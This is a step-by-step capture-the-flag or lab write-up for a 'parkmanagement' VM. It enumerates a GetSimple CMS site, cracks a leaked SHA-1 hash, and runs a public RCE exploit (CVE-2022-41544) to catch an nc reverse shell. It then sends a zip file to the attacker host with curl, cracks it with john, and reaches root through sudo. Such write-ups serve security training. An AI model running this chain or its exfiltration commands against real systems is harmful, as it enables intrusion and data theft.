# Exploitation Guide for parkmanagement

  

## Enumeration

  

We start the enumeration process with a simple Nmap scan:

  

```

  

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

  

└─# nmap 192.168.174.140

  

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-07 06:02 EDT

  

Nmap scan report for 192.168.174.140

  

Host is up (0.00026s latency).

  

Not shown: 996 filtered tcp ports (no-response)

  

PORT     STATE  SERVICE

  

22/tcp   open   ssh

  

80/tcp   open   http

  

443/tcp  closed https

  

8000/tcp closed http-alt

  

  

```

  

We find port 80 is open and visit it in our browser as a first step. It appears to be an Apache2 default page. We decide to perform directory busting to determine any interesting locations.

  
  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# dirsearch -u 192.168.174.140 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html

  from pkg_resources import DistributionNotFound, VersionConflict

  

  _|. _ _  _  _  _ _|_    v0.4.3

 (_||| _) (/_(_|| (_| )

  

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 207628

  

Output File: /home/kali/Documents/UGC/ParkMgmt/reports/_192.168.174.140/_24-05-07_06-07-22.txt

  

Target: http://192.168.174.140/

  

[06:07:22] Starting:

[06:07:22] 301 -  317B  - /data  ->  http://192.168.174.140/data/

[06:07:23] 301 -  318B  - /admin  ->  http://192.168.174.140/admin/

[06:07:23] 301 -  320B  - /plugins  ->  http://192.168.174.140/plugins/

[06:07:24] 301 -  318B  - /theme  ->  http://192.168.174.140/theme/

[06:07:35] 301 -  320B  - /backups  ->  http://192.168.174.140/backups/

  
  

```

  

  We find a number of interesting directories. Navigating to the admin directory presents a login page for a park management site, but no useful information on a possible default credential or exploit is presented here. Further enumeration of the data folder, we find a users directory with a single xml file which contains the following user information:

  

```

<item>

<USR>coolranger</USR>

<NAME>Cool Ranger</NAME>

<PWD>08802d707979e4d796a2538bed8cd67ef20f7c91</PWD>

<EMAIL>coolranger@parkmanagement.com</EMAIL>

<HTMLEDITOR>1</HTMLEDITOR>

<TIMEZONE/>

<LANG>en_US</LANG>

</item>

```

  

According to the hash identifier tool, this is most likely a SHA-1 hash.

  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# hash-identifier                                          

   #########################################################################

   #     __  __                     __           ______    _____           #

   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #

   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #

   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #

   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #

   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #

   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #

   #                                                             By Zion3R #

   #                                                    www.Blackploit.com #

   #                                                   Root@Blackploit.com #

   #########################################################################

--------------------------------------------------

 HASH: 08802d707979e4d796a2538bed8cd67ef20f7c91

  

Possible Hashs:

[+] SHA-1

[+] MySQL5 - SHA-1(SHA-1($pass))

  

```

## Exploitation

  

To begin the exploitation phase, we first crack the discovered hash with hashcat.

  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# echo "08802d707979e4d796a2538bed8cd67ef20f7c91" > hash

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# hashcat -a 0 -m 100 hash /usr/share/wordlists/rockyou.txt  

  

Dictionary cache hit:

* Filename..: /usr/share/wordlists/rockyou.txt

* Passwords.: 14344385

* Bytes.....: 139921507

* Keyspace..: 14344385

  

08802d707979e4d796a2538bed8cd67ef20f7c91:ranger1          

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 100 (SHA1)

Hash.Target......: 08802d707979e4d796a2538bed8cd67ef20f7c91

Time.Started.....: Tue May  7 06:15:53 2024 (0 secs)

Time.Estimated...: Tue May  7 06:15:53 2024 (0 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:  6169.1 kH/s (0.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 12288/14344385 (0.09%)

Rejected.........: 0/12288 (0.00%)

Restore.Point....: 6144/14344385 (0.04%)

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: horoscope -> hawkeye

Hardware.Mon.#1..: Util: 23%

  

Started: Tue May  7 06:15:52 2024

Stopped: Tue May  7 06:15:55 2024

  

```

  

The password cracked within seconds, we now have credentials for the login page `coolranger:ranger1`


While enumerating the website, there are no significant findings on the pages tab. Navigating to the files tab, we find two folders, `guestcenter` and `it`. The `guestcenter` folder appears to be a daily log for the park rangers at the guest center. Nothing useful is found here. Within the `it` folder, we see two additional IT admin notes. From these logs, we can decipher the CMS system has just recently been implemented for the park ranger staff to use, and they are trying to deconflict schedules to find time to update the system and reconfigure potential firewall vulnerabilities. Knowing this information we continue enumerating the website, and find this application name and version `GetSimple CMS – Version 3.3.16`. Upon searching for the web application software and version, we find this site is potentially vulnerable to Remote Code Execution with a Proof of Concept posted on the exploit database with EDB-ID 51475. We setup a listener, using one of the ports we know is open from the discovered notes, and run the exploit code to catch a reverse shell.
  
```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# searchsploit -m 51475

  Exploit: GetSimple CMS v3.3.16 - Remote Code Execution (RCE)

      URL: https://www.exploit-db.com/exploits/51475

     Path: /usr/share/exploitdb/exploits/php/webapps/51475.py

    Codes: CVE-2022-41544

 Verified: True

File Type: Python script, ASCII text executable

Copied to: /home/kali/Documents/UGC/ParkMgmt/51475.py

  

```

  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# python3 51475.py 192.168.174.140 / 192.168.174.128:443 coolranger

/home/kali/Documents/UGC/ParkMgmt/51475.py:16: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13

  import telnetlib

  

 CCC V     V EEEE      22   000   22   22      4  4  11  5555 4  4 4  4

C    V     V E        2  2 0  00 2  2 2  2     4  4 111  5    4  4 4  4

C     V   V  EEE  ---   2  0 0 0   2    2  --- 4444  11  555  4444 4444

C      V V   E         2   00  0  2    2          4  11     5    4    4

 CCC    V    EEEE     2222  000  2222 2222        4 11l1 555     4    4

[+] the version 3.3.16 is vulnrable to CVE-2022-41544

[+] apikey obtained 9344e8fd7e174240ddc1513643e64102

[+] csrf token obtained

[+] Shell uploaded successfully!

[+] Webshell trigged successfully!

```

  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# rlwrap -cAr nc -lvnp 443

listening on [any] 443 ...

connect to [192.168.174.128] from (UNKNOWN) [192.168.174.140] 45726

python3 -c 'import pty; pty.spawn("/bin/sh")'

  
  

$ whoami

whoami

www-data

  

```

  

Navigating to the home directory, we find a user folder for `brandon`. Looking back at the previously discovered IT logs, we see brandon is one of the IT admins. We also find a local.txt file which is readable, and also a `parkslog.zip` file.
  

```

$ cd brandon

cd brandon

$ pwd

pwd

/home/brandon

$ ls -la

ls -la

total 32

drwxr-xr-x 2 brandon brandon 4096 May  7 10:01 .

drwxr-xr-x 4 root    root    4096 May  7 10:01 ..

-rw-r--r-- 1 root    root       0 May  7 10:01 .bash_history

-rw-r--r-- 1 brandon brandon  220 Feb 25  2020 .bash_logout

-rw-r--r-- 1 brandon brandon 3771 Feb 25  2020 .bashrc

-rw-r--r-- 1 brandon brandon  807 Feb 25  2020 .profile

-rw-r--r-- 1 brandon brandon   33 May  7 10:01 local.txt

-rw-r--r-- 1 root    root    6599 May  7 10:01 parklogs.zip

  

$ $ id

id

uid=33(www-data) gid=33(www-data) groups=33(www-data)

$

  
  

```

  

## Escalation

  

We need to download this zip file to enumerate further. We first run a script which allows files to be uploaded to our kali machine. This script is setup to listen on port 8000, which is one of the other ports left open on the firewall of the machine we are attacking: https://gist.github.com/UniIsland/3346170

  

```

$ curl -F 'file=@/home/brandon/parklogs.zip' http://192.168.174.128:8000/

curl -F 'file=@/home/brandon/parklogs.zip' http://192.168.174.128:8000/

  
  

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>

<title>Upload Result Page</title>

<style type="text/css">

* {font-family: Helvetica; font-size: 16px; }

a { text-decoration: none; }

</style>

<body>

<h2>Upload Result Page</h2>

<hr>

<strong>Success!</strong><br><br>'/home/kali/Documents/UGC/ParkMgmt/parklogs.zip'<br><br><a href="None"><button>Back</button></a>

<hr><small>Powered By: bones7456<br>Check new version <a href="https://gist.github.com/UniIsland/3346170" target="_blank">here</a>.</small></body>

</html

  

```

  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# python3 SimpleHTTPServerWithUpload.py

Serving HTTP on localhost port 8000 (http://localhost:8000/) ...

(True, "<br><br>'/home/kali/Documents/UGC/ParkMgmt/parklogs.zip'", 'by: ', ('192.168.174.140', 57302))

192.168.174.140 - - [07/May/2024 06:34:02] "POST / HTTP/1.1" 200 -

  

```

  

We try to unzip the file, but it is password protected. We use the `zip2john` tool to get a hash to attempt to crack. We then crack the password with john `deerpark3`

  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# unzip parklogs.zip

Archive:  parklogs.zip

[parklogs.zip] cmslog password:                                                                                                                                          

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# zip2john parklogs.zip > hash

ver 2.0 efh 5455 efh 7875 parklogs.zip/cmslog PKZIP Encr: TS_chk, cmplen=6421, decmplen=70326, crc=2F2EBF83 ts=9F0E cs=9f0e type=8

  

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8

Loaded 1 password hash (PKZIP [32/64])

Will run 6 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

deerpark3        (parklogs.zip/cmslog)    

1g 0:00:00:00 DONE (2024-05-07 06:36) 2.083g/s 18150Kp/s 18150Kc/s 18150KC/s dejashy2..deckspin

Use the "--show" option to display all of the cracked passwords reliably

Session completed.

  
  

```

  

When we unzip the file, there is a single document `cmslog`. It contains many log entries, but when we grep for `password` we find credentials:

  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC/ParkMgmt]

└─# cat cmslog | grep "password"

192.168.0.42 - - [01/May/2024:14:03:15 +0000] "POST /ranger/login HTTP/1.1" 200 - "Mozilla/5.0" "username=Brandon&password=ILoveParkandRecreation2024"

  

```

  

We ssh into the machine successfully as the user brandon. When we check `sudo -l` we find brandon is in the sudoers group. We simply `sudo su` and obtain `root` access.

  

```

┌──(root㉿kali)-[/home/kali/Documents/UGC]

└─# ssh brandon@192.168.174.140

brandon@192.168.174.140's password:

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-177-generic x86_64)

  

$ sudo -L

sudo: invalid option -- 'L'

usage: sudo -h | -K | -k | -V

usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]

usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]

usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s]

            [<command>]

usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...

$ sudo -l

[sudo] password for brandon:

Matching Defaults entries for brandon on parkmanagement:

    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  

User brandon may run the following commands on parkmanagement:

    (ALL : ALL) ALL

  

$ sudo su

root@parkmanagement:/home/brandon# cd /root

root@parkmanagement:~# id

uid=0(root) gid=0(root) groups=0(root)

  
  
  

```